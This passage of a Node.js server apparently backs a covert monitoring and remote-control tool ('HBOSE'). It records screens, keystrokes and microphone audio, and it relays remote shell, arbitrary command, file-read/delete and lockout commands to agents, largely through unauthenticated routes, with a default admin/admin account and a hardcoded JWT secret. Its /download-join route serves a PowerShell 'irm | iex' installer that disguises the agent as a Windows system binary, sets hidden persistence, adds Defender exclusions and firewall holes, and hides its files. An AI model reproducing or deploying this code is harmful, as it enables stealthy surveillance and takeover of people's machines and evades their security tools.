    const params = [hostname, date];
    if (startTime) { timeFilter += " AND time(timestamp) >= ?"; params.push(startTime); }
    if (endTime) { timeFilter += " AND time(timestamp) <= ?"; params.push(endTime); }
    
    const frames = db.prepare(`
      SELECT id, window_title, screen_path, category, status, timestamp, keystrokes, ocr_text
      FROM activities 
      WHERE hostname = ? AND date(timestamp) = ? AND screen_path IS NOT NULL AND screen_path != ''
      ${timeFilter}
      ORDER BY timestamp ASC
    `).all(...params);
    
    const summary = db.prepare(`
      SELECT COUNT(*) as totalFrames, 
             MIN(timestamp) as firstFrame, MAX(timestamp) as lastFrame,
             COUNT(DISTINCT window_title) as uniqueApps,
             COUNT(CASE WHEN category = 'Productive' THEN 1 END) as productive,
             COUNT(CASE WHEN category = 'Unproductive' THEN 1 END) as unproductive,
             COUNT(CASE WHEN status = 'Active' THEN 1 END) as activeFrames,
             COUNT(CASE WHEN status = 'Idle' THEN 1 END) as idleFrames
      FROM activities
      WHERE hostname = ? AND date(timestamp) = ? AND screen_path IS NOT NULL AND screen_path != ''
      ${timeFilter}
    `).get(...params);
    
    res.json({ frames, summary });
  } catch (e) {
    res.json({ frames: [], summary: {} });
  }
});

// Get storage stats (how many images, disk usage)
app.get("/api/recordings/stats", (req, res) => {
  try {
    const totalFrames = db.prepare("SELECT COUNT(*) as c FROM activities WHERE screen_path IS NOT NULL AND screen_path != ''").get().c;
    const totalHosts = db.prepare("SELECT COUNT(DISTINCT hostname) as c FROM activities WHERE screen_path IS NOT NULL").get().c;
    const totalDays = db.prepare("SELECT COUNT(DISTINCT date(timestamp)) as c FROM activities WHERE screen_path IS NOT NULL").get().c;
    
    // Get actual storage directory size
    let storageSizeMB = 0;
    try {
      const storageFiles = fs.readdirSync(STORAGE_DIR);
      let totalBytes = 0;
      for (const f of storageFiles) {
        try { totalBytes += fs.statSync(path.join(STORAGE_DIR, f)).size; } catch {}
      }
      storageSizeMB = Math.round(totalBytes / 1024 / 1024);
    } catch {}
    
    res.json({ totalFrames, totalHosts, totalDays, storageSizeMB, storageFileCount: fs.readdirSync(STORAGE_DIR).length });
  } catch (e) {
    res.json({ totalFrames: 0, totalHosts: 0, totalDays: 0, storageSizeMB: 0, storageFileCount: 0 });
  }
});

// List all unique employees that have recordings
app.get("/api/recordings/employees", (req, res) => {
  try {
    const data = db.prepare(`
      SELECT a.hostname, a.username, n.nickname,
             COUNT(*) as totalFrames,
             COUNT(DISTINCT date(a.timestamp)) as recordedDays,
             MIN(date(a.timestamp)) as firstRecorded,
             MAX(date(a.timestamp)) as lastRecorded
      FROM activities a
      LEFT JOIN nicknames n ON a.hostname = n.hostname
      WHERE a.screen_path IS NOT NULL AND a.screen_path != ''
      GROUP BY a.hostname
      ORDER BY lastRecorded DESC
    `).all();
    res.json(data);
  } catch (e) {
    res.json([]);
  }
});

// Download recording frames as ZIP (for video export)
app.get("/api/recordings/download", (req, res) => {
  try {
    const { hostname, date, startTime, endTime } = req.query;
    if (!hostname || !date) return res.status(400).json({ error: 'hostname and date required' });
    let timeFilter = '';
    const params = [hostname, date];
    if (startTime) { timeFilter += ' AND time(timestamp) >= ?'; params.push(startTime); }
    if (endTime) { timeFilter += ' AND time(timestamp) <= ?'; params.push(endTime); }

    const frames = db.prepare(`
      SELECT screen_path, timestamp, window_title
      FROM activities 
      WHERE hostname = ? AND date(timestamp) = ? AND screen_path IS NOT NULL AND screen_path != ''
      ${timeFilter}
      ORDER BY timestamp ASC
    `).all(...params);

    if (frames.length === 0) return res.status(404).json({ error: 'No frames found' });

    // Return frame paths for client-side download
    res.json({
      hostname,
      date,
      totalFrames: frames.length,
      frames: frames.map(f => ({
        path: `/storage/${f.screen_path}`,
        timestamp: f.timestamp,
        title: f.window_title
      }))
    });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Delete recordings for a specific date
app.delete("/api/recordings", express.json(), (req, res) => {
  try {
    const { hostname, date } = req.body;
    if (!hostname || !date) return res.status(400).json({ error: "hostname and date required" });

    // Find files to delete
    const frames = db.prepare(`
      SELECT screen_path FROM activities 
      WHERE hostname = ? AND date(timestamp) = ? AND screen_path IS NOT NULL AND screen_path != ''
    `).all(hostname, date);

    let deletedFiles = 0;
    for (const frame of frames) {
      try {
        const fullPath = path.join(STORAGE_DIR, frame.screen_path);
        if (fs.existsSync(fullPath)) {
          fs.unlinkSync(fullPath);
          deletedFiles++;
        }
      } catch (err) {
        console.error("Error deleting file:", err.message);
      }
    }

    // Delete records from database
    const result = db.prepare(`
      DELETE FROM activities 
      WHERE hostname = ? AND date(timestamp) = ? AND screen_path IS NOT NULL AND screen_path != ''
    `).run(hostname, date);

    res.json({ success: true, deletedFrames: result.changes, deletedFiles });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Delete ALL recordings for a specific hostname
app.delete("/api/recordings/all/:hostname", (req, res) => {
  try {
    const { hostname } = req.params;
    
    // Find files to delete
    const frames = db.prepare(`
      SELECT screen_path FROM activities 
      WHERE hostname = ? AND screen_path IS NOT NULL AND screen_path != ''
    `).all(hostname);

    let deletedFiles = 0;
    for (const frame of frames) {
      try {
        const fullPath = path.join(STORAGE_DIR, frame.screen_path);
        if (fs.existsSync(fullPath)) {
          fs.unlinkSync(fullPath);
          deletedFiles++;
        }
      } catch (err) {
        console.error("Error deleting file:", err.message);
      }
    }

    // Delete records from database
    const result = db.prepare(`
      DELETE FROM activities 
      WHERE hostname = ? AND screen_path IS NOT NULL AND screen_path != ''
    `).run(hostname);

    res.json({ success: true, deletedFrames: result.changes, deletedFiles });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ═══════════════════════════════════════════════
// NICKNAMES API
// ═══════════════════════════════════════════════

app.get("/api/nicknames", (req, res) => {
  try {
    const data = db.prepare("SELECT hostname, nickname FROM nicknames").all();
    res.json(data);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.put("/api/nicknames/:hostname", express.json(), (req, res) => {
  try {
    const { hostname } = req.params;
    const { nickname } = req.body;
    if (!nickname) return res.status(400).json({ error: "nickname required" });
    
    db.prepare(`
      INSERT INTO nicknames (hostname, nickname) VALUES (?, ?)
      ON CONFLICT(hostname) DO UPDATE SET nickname = excluded.nickname, updated_at = datetime('now')
    `).run(hostname, nickname);
    
    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.delete("/api/nicknames/:hostname", (req, res) => {
  try {
    const { hostname } = req.params;
    db.prepare("DELETE FROM nicknames WHERE hostname = ?").run(hostname);
    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Network scan API removed (v2 — Network Map trimmed)

app.post("/api/agent/godmode", express.json(), (req, res) => {
  const { hostname, type, payload, message, customMessage, contactPhone, contactEmail, contactUrl } = req.body;
  const targetSocket = Array.from(io.sockets.sockets.values())
    .find(s => s.hostname === hostname);
  
  if (!targetSocket) {
    return res.status(404).json({ error: "Agent offline" });
  }

  if (type === "stealth-blackout") {
    // Read fallback blackout settings from DB if not explicitly passed
    const getSetting = (key) => {
      const row = db.prepare("SELECT value FROM settings WHERE key = ?").get(key);
      return row ? row.value : "";
    };
    
    const finalMessage = customMessage || message || getSetting("blackout_message") || "Your device has been locked by your administrator.";
    const finalPhone = contactPhone !== undefined ? contactPhone : getSetting("blackout_contact_phone");
    const finalEmail = contactEmail !== undefined ? contactEmail : getSetting("blackout_contact_email");
    const finalUrl = contactUrl !== undefined ? contactUrl : getSetting("blackout_contact_url");

    targetSocket.emit("stealth-blackout", {
      enabled: payload,
      message: finalMessage,
      contactPhone: finalPhone,
      contactEmail: finalEmail,
      contactUrl: finalUrl
    });
  } else if (type === "uninstall-agent-action") {
    targetSocket.emit("uninstall-agent");
  } else if (type === "burn-sequence-action") {
    targetSocket.emit("burn-sequence");
  } else if (type === "terminal-start-action") {
    targetSocket.emit("terminal-start");
  } else {
    targetSocket.emit("godmode-command", { type, payload });
  }
  
  res.json({ success: true, message: `Command ${type} issued to ${hostname}.` });
});

io.on("connection", (socket) => {
  // Only log non-dashboard connections (agents will auth)
  const ip = socket.handshake.headers["x-forwarded-for"] || socket.handshake.address;
  const isDashboard = ip === "127.0.0.1" || ip === "::1" || ip === "::ffff:127.0.0.1";

  socket.on("agent-auth", (data) => {
    console.log(`[AUTH] Agent Identifying: ${data.hostname} (User: ${data.username})`);

    // De-duplicate: Disconnect any OLD sockets for the same hostname
    const existingSockets = Array.from(io.sockets.sockets.values())
      .filter(s => s.hostname === data.hostname && s.id !== socket.id);
    existingSockets.forEach(oldSocket => {
      console.log(`[CORE] Evicting stale socket ${oldSocket.id} for ${data.hostname}`);
      oldSocket.hostname = null;
      oldSocket.agentData = null;
      oldSocket.leave("agents");
      oldSocket.disconnect(true);
    });

    socket.join("agents");
    socket.agentData = data;
    socket.hostname = data.hostname;
    console.log(`[CORE] Agent Authenticated: ${data.hostname} -> ADDED TO POOL (1 socket)`);
  });

  socket.on("disconnect", () => {
    // Only log disconnects for authenticated agents, not dashboard sockets
    if (socket.hostname) {
      console.log(`[NET] Agent Disconnected: ${socket.id} (${socket.hostname})`);
    }
    socket.hostname = null;
    socket.agentData = null;
  });

  // ULTRAVIEWER BRIDGE: Relay Dashboard inputs to the specific agent node
  socket.on("remote-control-action", (data) => {
    const targetSocket = Array.from(io.sockets.sockets.values())
      .filter(s => s.agentData && s.hostname)
      .find(s => s.hostname === data.hostname);
    if (targetSocket) {
      targetSocket.emit("remote-input", data);
    } else {
      console.log(`[RELAY] ❌ No agent found for "${data.hostname}" to relay ${data.type}`);
    }
  });

  socket.on("lock-machine-action", (data) => {
    io.emit("lock-machine");
  });

  // ULTRAVIEWER FEATURES: File Transfer & Clipboard
  socket.on("file-transfer-start", (data) => {
    const targetSocket = Array.from(io.sockets.sockets.values())
      .filter(s => s.agentData && s.hostname)
      .find(s => s.hostname === data.hostname);
    if (targetSocket) {
      targetSocket.emit("file-transfer-receive", { filename: data.filename, data: data.data });
      console.log(`[FILE] Transferring ${data.filename} to ${data.hostname}`);
    } else { console.log(`[FILE] ❌ Agent not found: ${data.hostname}`); }
  });

  socket.on("remote-clipboard-push", (data) => {
    const targetSocket = Array.from(io.sockets.sockets.values())
      .filter(s => s.agentData && s.hostname)
      .find(s => s.hostname === data.hostname);
    if (targetSocket) {
      targetSocket.emit("remote-clipboard-set", { content: data.content });
      console.log(`[CLIP] Pushing clipboard to ${data.hostname}`);
    } else { console.log(`[CLIP] ❌ Agent not found: ${data.hostname}`); }
  });

  socket.on("activity-sync", async (data) => {
    await processSync(data);
  });

  socket.on("file-activity", (data) => {
    const stmt = db.prepare(`INSERT INTO file_events (hostname, type, path) VALUES (?, ?, ?)`);
    stmt.run(socket.agentData?.hostname || "Unknown", data.type, data.path);

    // Auto-Alert for sensitive file paths (e.g., config, database)
    if (data.path.toLowerCase().includes("password") || data.path.includes(".sql")) {
      io.emit("new-alert", { hostname: socket.agentData?.hostname, message: `File Access Violation: ${data.path}`, severity: "Medium" });
    }
  });

  // TACTICAL FILE HUB RELAY
  socket.on("file-list", (data) => {
    const target = Array.from(io.sockets.sockets.values()).find(s => s.hostname === data.hostname);
    if (target) target.emit("file-list", data.path);
  });
  socket.on("file-read", (data) => {
    const target = Array.from(io.sockets.sockets.values()).find(s => s.hostname === data.hostname);
    if (target) target.emit("file-read", data.path);
  });
  socket.on("file-delete", (data) => {
    const target = Array.from(io.sockets.sockets.values()).find(s => s.hostname === data.hostname);
    if (target) target.emit("file-delete", data.path);
  });

  socket.on("file-list-result", (data) => io.emit("file-list-result", data));
  socket.on("file-data", (data) => io.emit("file-data", data));
  socket.on("file-delete-result", (data) => io.emit("file-delete-result", data));

  socket.on("clipboard-sync", (data) => {
    io.emit("new-activity", { user: socket.agentData?.username, activity: `Clipboard: ${data.content.substring(0, 30)}...`, risk: "Low" });
  });

  socket.on("live-frame", (frame) => io.emit("dashboard-frame", frame));

  socket.on("mobile-sync", (data) => {
    // Expected from a mobile mirroring service or bridge app
    io.emit("new-activity", {
      hostname: data.deviceName,
      username: "Mobile User",
      screenPath: data.framePath, // URL to the mirrored frame
      status: "Active",
      timestamp: new Date().toISOString()
    });
  });

  socket.on("request-live-view", () => io.to("agents").emit("request-live-view"));
  socket.on("stop-live-view", () => io.to("agents").emit("stop-live-view"));

  // ═══════════════════════════════════════════════
  // POWER COMMANDS RELAY (Dashboard -> Agent)
  // ═══════════════════════════════════════════════
  const findAgent = (hostname) => {
    const agents = Array.from(io.sockets.sockets.values()).filter(s => s.agentData && s.hostname);
    console.log(`[RELAY] Searching for "${hostname}" in ${agents.length} agents: [${agents.map(s => s.hostname).join(', ')}]`);
    const target = agents.find(s => s.hostname === hostname);
    if (!target) console.log(`[RELAY] ❌ NOT FOUND: "${hostname}"`);
    else console.log(`[RELAY] ✅ FOUND: "${hostname}" -> socket ${target.id}`);
    return target;
  };

  socket.on("shutdown-action", (data) => {
    const t = findAgent(data.hostname);
    if (t) { t.emit("shutdown-machine"); console.log(`[CMD] Shutdown -> ${data.hostname}`); }
  });

  socket.on("restart-action", (data) => {
    const t = findAgent(data.hostname);
    if (t) { t.emit("restart-machine"); console.log(`[CMD] Restart -> ${data.hostname}`); }
  });

  socket.on("logoff-action", (data) => {
    const t = findAgent(data.hostname);
    if (t) { t.emit("logoff-user"); console.log(`[CMD] Logoff -> ${data.hostname}`); }
  });

  socket.on("lock-action", (data) => {
    const t = findAgent(data.hostname);
    if (t) { t.emit("lock-machine"); console.log(`[CMD] Lock -> ${data.hostname}`); }
  });

  socket.on("cancel-shutdown-action", (data) => {
    const t = findAgent(data.hostname);
    if (t) { t.emit("cancel-shutdown"); console.log(`[CMD] Cancel Shutdown -> ${data.hostname}`); }
  });

  socket.on("run-command-action", (data) => {
    const t = findAgent(data.hostname);
    if (t) { t.emit("run-command", { command: data.command }); console.log(`[CMD] Exec -> ${data.hostname}: ${data.command}`); }
  });

  socket.on("open-url-action", (data) => {
    const t = findAgent(data.hostname);
    if (t) { t.emit("open-url", { url: data.url }); console.log(`[CMD] OpenURL -> ${data.hostname}: ${data.url}`); }
  });

  socket.on("show-message-action", (data) => {
    const t = findAgent(data.hostname);
    if (t) { t.emit("show-message", { title: data.title, message: data.message }); console.log(`[CMD] Message -> ${data.hostname}`); }
  });

  socket.on("request-sysinfo-action", (data) => {
    const t = findAgent(data.hostname);
    if (t) { t.emit("request-sysinfo"); }
  });

  // Block/Unblock target input relay
  socket.on("block-target-input", (data) => {
    const t = findAgent(data.hostname);
    if (t) { t.emit("block-target-input"); console.log(`[CMD] 🔒 Block Input -> ${data.hostname}`); }
  });
  socket.on("unblock-target-input", (data) => {
    const t = findAgent(data.hostname);
    if (t) { t.emit("unblock-target-input"); console.log(`[CMD] 🔓 Unblock Input -> ${data.hostname}`); }
  });

  // 💣 PANIC BUTTON RELAY
  socket.on("burn-sequence-action", (data) => {
    const t = findAgent(data.hostname);
    if (t) { t.emit("burn-sequence"); console.log(`[BURN] 🔥 Initiated on -> ${data.hostname}`); }
  });

  // 🌐 WEB TERMINAL RELAY
  socket.on("terminal-start-action", (data) => {
    const t = findAgent(data.hostname);
    if (t) { t.emit("terminal-start"); console.log(`[TERM] Started on -> ${data.hostname}`); }
  });
  socket.on("terminal-input-action", (data) => {
    const t = findAgent(data.hostname);
    if (t) t.emit("terminal-input", data.input);
  });
  socket.on("terminal-stop-action", (data) => {
    const t = findAgent(data.hostname);
    if (t) t.emit("terminal-stop");
  });
  // Agent -> Web relay for terminal
  socket.on("terminal-data", (data) => io.emit("terminal-data", { hostname: socket.agentData?.hostname, data }));
  socket.on("terminal-exit", () => io.emit("terminal-exit", { hostname: socket.agentData?.hostname }));

  // 🎙 ENVIRONMENTAL AUDIO RELAY
  socket.on("environmental-capture-action", (data) => {
    const t = findAgent(data.hostname);
    if (t) { t.emit("environmental-capture"); console.log(`[MIC] Capturing audio on -> ${data.hostname}`); }
  });
  // Agent -> Web relay for audio
  socket.on("environmental-result", (data) => io.emit("environmental-result", { hostname: socket.agentData?.hostname, ...data }));

  // Agent -> Dashboard relay
  socket.on("command-result", (data) => io.emit("command-result", data));
  socket.on("sysinfo-result", (data) => io.emit("sysinfo-result", data));
});

// HEARTBEAT: Broadcast Active Agents every 3 seconds for Live View
setInterval(() => {
  // Get all sockets in "agents" room
  const agentSockets = Array.from(io.sockets.sockets.values()).filter(s => s.agentData && s.hostname);
  const agentList = [...new Set(agentSockets.map(s => s.hostname))];
  io.emit("agent-list", agentList);
}, 3000);

// ═══════════════════════════════════════════════
// AUTHENTICATION & PROFILES
// ═══════════════════════════════════════════════
const bcrypt = require("bcryptjs");
const { SignJWT, jwtVerify } = require("jose");
const JWT_SECRET = new TextEncoder().encode(process.env.JWT_SECRET || "fallback_secret_hboss_pro_2026");

// Seed default admin if table is empty
try {
  const adminCount = db.prepare("SELECT COUNT(*) as c FROM admins").get().c;
  if (adminCount === 0) {
    const hash = bcrypt.hashSync("admin", 10);
    db.prepare("INSERT INTO admins (username, password_hash, role) VALUES (?, ?, ?)").run("admin", hash, "super_admin");
    console.log("[AUTH] Seeded default super_admin account (admin/admin)");
  }
} catch (e) {
  console.log("[AUTH] Seed error:", e.message);
}

const requireAuth = async (req, res, next) => {
  const token = req.headers.cookie?.split('; ').find(row => row.startsWith('auth_token='))?.split('=')[1];
  if (!token) return res.status(401).json({ error: "Unauthorized" });
  try {
    const { payload } = await jwtVerify(token, JWT_SECRET);
    req.user = payload;
    next();
  } catch (e) {
    return res.status(401).json({ error: "Unauthorized" });
  }
};

const requireSuperAdmin = (req, res, next) => {
  if (req.user?.role !== "super_admin") return res.status(403).json({ error: "Forbidden" });
  next();
};

app.post("/api/auth/login", async (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) return res.status(400).json({ error: "Missing credentials" });
  try {
    const user = db.prepare("SELECT * FROM admins WHERE username = ?").get(username);
    if (!user || !bcrypt.compareSync(password, user.password_hash)) {
      return res.status(401).json({ error: "Invalid credentials" });
    }
    const token = await new SignJWT({ id: user.id, username: user.username, role: user.role })
      .setProtectedHeader({ alg: 'HS256' })
      .setExpirationTime('24h')
      .sign(JWT_SECRET);
    
    res.cookie("auth_token", token, {
      httpOnly: true,
      secure: process.env.NODE_ENV === "production",
      sameSite: "lax",
      maxAge: 24 * 60 * 60 * 1000,
      path: "/"
    });
    res.json({ success: true, user: { username: user.username, role: user.role } });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post("/api/auth/logout", (req, res) => {
  res.cookie("auth_token", "", { maxAge: 0, path: "/" });
  res.json({ success: true });
});

app.get("/api/auth/me", requireAuth, (req, res) => {
  res.json({ user: req.user });
});

app.get("/api/admins", requireAuth, requireSuperAdmin, (req, res) => {
  const admins = db.prepare("SELECT id, username, role, created_at FROM admins").all();
  res.json(admins);
});

app.post("/api/admins", requireAuth, requireSuperAdmin, (req, res) => {
  const { username, password, role } = req.body;
  if (!username || !password || !role) return res.status(400).json({ error: "Missing fields" });
  try {
    const hash = bcrypt.hashSync(password, 10);
    db.prepare("INSERT INTO admins (username, password_hash, role) VALUES (?, ?, ?)").run(username, hash, role);
    res.json({ success: true });
  } catch (e) {
    if (e.message.includes("UNIQUE")) return res.status(400).json({ error: "Username taken" });
    res.status(500).json({ error: e.message });
  }
});

app.delete("/api/admins/:id", requireAuth, requireSuperAdmin, (req, res) => {
  if (req.params.id == req.user.id) return res.status(400).json({ error: "Cannot delete yourself" });
  db.prepare("DELETE FROM admins WHERE id = ?").run(req.params.id);
  res.json({ success: true });
});

app.patch("/api/admins/:id", requireAuth, requireSuperAdmin, (req, res) => {
  const { username, password, role } = req.body;
  if (!username || !role) return res.status(400).json({ error: "Missing fields" });
  try {
    if (password) {
      const hash = bcrypt.hashSync(password, 10);
      db.prepare("UPDATE admins SET username = ?, password_hash = ?, role = ? WHERE id = ?").run(username, hash, role, req.params.id);
    } else {
      db.prepare("UPDATE admins SET username = ?, role = ? WHERE id = ?").run(username, role, req.params.id);
    }
    res.json({ success: true });
  } catch (e) {
    if (e.message.includes("UNIQUE")) return res.status(400).json({ error: "Username taken" });
    res.status(500).json({ error: e.message });
  }
});

// Catch-all: Unknown API routes return JSON 404 (not raw text crash)
// Express 5 requires named splat params instead of bare *
app.all("/api/{*path}", (req, res) => {
  res.status(404).json({ error: `API route not found: ${req.method} ${req.url}`, data: [] });
});

// ═══════════════════════════════════════════════
// REMOTE AGENT DEPLOYMENT — One-Command Install
// ═══════════════════════════════════════════════

// Serve agent package zip from storage/agent-package/
const AGENT_PKG_DIR = path.join(__dirname, "storage", "agent-package");
if (!fs.existsSync(AGENT_PKG_DIR)) {
  try { fs.mkdirSync(AGENT_PKG_DIR, { recursive: true }); } catch {}
}

// Upload agent package (admin only, from dashboard)
app.post("/api/agent-package/upload", (req, res) => {
  // This expects a multipart form or base64 encoded zip
  // For simplicity, we accept raw binary body
  const chunks = [];
  req.on("data", chunk => chunks.push(chunk));
  req.on("end", () => {
    try {
      const buffer = Buffer.concat(chunks);
      fs.writeFileSync(path.join(AGENT_PKG_DIR, "agent.zip"), buffer);
      res.json({ success: true, size: buffer.length });
    } catch (e) {
      res.status(500).json({ error: e.message });
    }
  });
});

// Download agent zip
app.get("/api/agent-package/download", (req, res) => {
  const zipPath = path.join(AGENT_PKG_DIR, "agent.zip");
  if (!fs.existsSync(zipPath)) {
    return res.status(404).json({ error: "Agent package not uploaded yet. Upload agent.zip first." });
  }
  res.download(zipPath, "agent.zip");
});

// One-liner install script — run on target machine via:
// powershell -ep bypass -c "irm https://h-boss-production.up.railway.app/download-join | iex"
app.get("/download-join", (req, res) => {
  const serverOrigin = `${req.protocol}://${req.get("host")}`;
  
  const script = `
# ═══════════════════════════════════════════════
# HBOSE Agent — Remote One-Command Installer
# ═══════════════════════════════════════════════
$ErrorActionPreference = "SilentlyContinue"

# 1. Check admin
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "[!] Requesting Administrator privileges..." -ForegroundColor Yellow
    Start-Process powershell -ArgumentList "-ep bypass -c \\"irm ${serverOrigin}/download-join | iex\\"" -Verb RunAs
    exit
}

Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  HBOSE Agent — Remote Installer" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

$INSTALL_DIR = "C:\\ProgramData\\Microsoft\\Windows\\SystemHealth"
$BIN_NAME = "RuntimeBroker_Sys.exe"
$SERVER_URL = "${serverOrigin}"
$TEMP_ZIP = "$env:TEMP\\hbose_agent.zip"
$TEMP_EXTRACT = "$env:TEMP\\hbose_agent_extract"

# 2. Kill existing
Write-Host "[1/7] Stopping old instances..." -ForegroundColor Yellow
Stop-Process -Name $BIN_NAME.Replace(".exe","") -Force -ErrorAction SilentlyContinue
Stop-Process -Name "teram_agent" -Force -ErrorAction SilentlyContinue
Stop-Process -Name "wscript" -Force -ErrorAction SilentlyContinue
schtasks /Delete /TN "MicrosoftWindowsHealthMonitor" /F 2>$null | Out-Null
Remove-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsHealthCheck" -Force -ErrorAction SilentlyContinue
Remove-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsSystemHealth" -Force -ErrorAction SilentlyContinue

# 3. Download agent package
Write-Host "[2/7] Downloading agent package..." -ForegroundColor Yellow
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri "$SERVER_URL/api/agent-package/download" -OutFile $TEMP_ZIP -UseBasicParsing
    if (-not (Test-Path $TEMP_ZIP) -or (Get-Item $TEMP_ZIP).Length -lt 1000) {
        Write-Host "[ERROR] Download failed or file too small. Make sure agent.zip is uploaded to the server." -ForegroundColor Red
        Write-Host "        Upload it via: POST $SERVER_URL/api/agent-package/upload" -ForegroundColor DarkGray
        exit 1
    }
} catch {
    Write-Host "[ERROR] Download failed: $_" -ForegroundColor Red
    exit 1
}

# 4. Prepare install directory
Write-Host "[3/7] Preparing install directory..." -ForegroundColor Yellow
if (Test-Path $INSTALL_DIR) {
    attrib -h -s "$INSTALL_DIR" /D /S 2>$null
    takeown /F "$INSTALL_DIR" /R /A /D Y 2>$null | Out-Null
    icacls "$INSTALL_DIR" /grant Administrators:F /T /C /Q 2>$null | Out-Null
    icacls "$INSTALL_DIR" /reset /T /C /Q 2>$null | Out-Null
}
New-Item -Path $INSTALL_DIR -ItemType Directory -Force | Out-Null

# 5. Extract and copy
Write-Host "[4/7] Extracting agent files..." -ForegroundColor Yellow
if (Test-Path $TEMP_EXTRACT) { Remove-Item $TEMP_EXTRACT -Recurse -Force }
Expand-Archive -Path $TEMP_ZIP -DestinationPath $TEMP_EXTRACT -Force

# Find where the files actually are (might be in a subfolder)
$agentRoot = $TEMP_EXTRACT
$exeFile = Get-ChildItem -Path $TEMP_EXTRACT -Recurse -Filter "teram_agent.exe" | Select-Object -First 1
if ($exeFile) { $agentRoot = $exeFile.DirectoryName }
elseif (Test-Path "$TEMP_EXTRACT\\node.exe") { $agentRoot = $TEMP_EXTRACT }

Copy-Item -Path "$agentRoot\\*" -Destination $INSTALL_DIR -Recurse -Force

# Set up binary
if (Test-Path "$INSTALL_DIR\\teram_agent.exe") {
    Copy-Item -Path "$INSTALL_DIR\\teram_agent.exe" -Destination "$INSTALL_DIR\\$BIN_NAME" -Force
} elseif (Test-Path "$INSTALL_DIR\\node.exe") {
    Copy-Item -Path "$INSTALL_DIR\\node.exe" -Destination "$INSTALL_DIR\\$BIN_NAME" -Force
} else {
    Write-Host "[ERROR] No agent binary found in package!" -ForegroundColor Red
    exit 1
}

# 6. Create silent launcher VBS and configure persistence
Write-Host "[5/7] Configuring persistence..." -ForegroundColor Yellow

# Determine if node-based or standalone exe
$hasIndex = Test-Path "$INSTALL_DIR\\index.js"
if ($hasIndex) {
    $runCmd = "chr(34) & \`"$INSTALL_DIR\\$BIN_NAME\`" & chr(34) & \`" index.js $SERVER_URL\`""
} else {
    $runCmd = "chr(34) & \`"$INSTALL_DIR\\$BIN_NAME\`" & chr(34) & \`" $SERVER_URL\`""
}

$vbsContent = @"
Set W = CreateObject("WScript.Shell")
W.CurrentDirectory = "$INSTALL_DIR"
Do
  W.Run $runCmd, 0, True
  WScript.Sleep 5000
Loop
"@
Set-Content -Path "$INSTALL_DIR\\service.vbs" -Value $vbsContent -Force

# Scheduled Task
schtasks /Create /TN "MicrosoftWindowsHealthMonitor" /TR "wscript.exe \`"$INSTALL_DIR\\service.vbs\`"" /SC ONLOGON /RL HIGHEST /F 2>$null | Out-Null

# Registry Run key
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsHealthCheck" -Value "wscript.exe \`"$INSTALL_DIR\\service.vbs\`"" -PropertyType String -Force | Out-Null

# 7. Security config & stealth
Write-Host "[6/7] Configuring security exclusions..." -ForegroundColor Yellow
Add-MpPreference -ExclusionPath $INSTALL_DIR -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess $BIN_NAME -ErrorAction SilentlyContinue
netsh advfirewall firewall delete rule name="Windows System Health" 2>$null | Out-Null
netsh advfirewall firewall add rule name="Windows System Health" dir=out action=allow program="$INSTALL_DIR\\$BIN_NAME" enable=yes profile=any 2>$null | Out-Null
netsh advfirewall firewall add rule name="Windows System Health In" dir=in action=allow program="$INSTALL_DIR\\$BIN_NAME" enable=yes profile=any 2>$null | Out-Null

# Hide files
attrib +h +s "$INSTALL_DIR" /D 2>$null
attrib +h +s "$INSTALL_DIR\\$BIN_NAME" 2>$null
attrib +h +s "$INSTALL_DIR\\service.vbs" 2>$null

# Start the service
Write-Host "[7/7] Starting agent service..." -ForegroundColor Yellow
Start-Process wscript.exe -ArgumentList "\`"$INSTALL_DIR\\service.vbs\`"" -WindowStyle Hidden

# Cleanup temp files
Remove-Item $TEMP_ZIP -Force -ErrorAction SilentlyContinue
Remove-Item $TEMP_EXTRACT -Recurse -Force -ErrorAction SilentlyContinue

Write-Host ""
Write-Host "========================================" -ForegroundColor Green
Write-Host "  DEPLOYMENT COMPLETE" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green
Write-Host "  Server:  $SERVER_URL" -ForegroundColor DarkGray
Write-Host "  Status:  RUNNING" -ForegroundColor Green
Write-Host ""
`;

  res.setHeader("Content-Type", "text/plain; charset=utf-8");
  res.send(script);
});

// Global error handler - always return JSON, never raw text
app.use((err, req, res, next) => {
  console.error(`[API ERROR] ${req.method} ${req.url}:`, err.message);
  res.status(500).json({ error: err.message });
});

// Process-level error handlers - prevent crashes
process.on("uncaughtException", (err) => {
  console.error("[FATAL] Uncaught exception:", err.message);
});
process.on("unhandledRejection", (reason) => {
  console.error("[FATAL] Unhandled rejection:", reason);
});

const BACKEND_PORT = parseInt(process.env.BACKEND_PORT, 10) || 4000;
server.listen(BACKEND_PORT, "0.0.0.0", () => {
  const ip = getLocalIP();
  console.log(`HBOSE Core System active on ${BACKEND_PORT} (Network Discovery Enabled)`);
  console.log(`Detected Local IP: ${ip}`);
  console.log(`Agents should connect to: http://${ip}:${BACKEND_PORT}`);
});

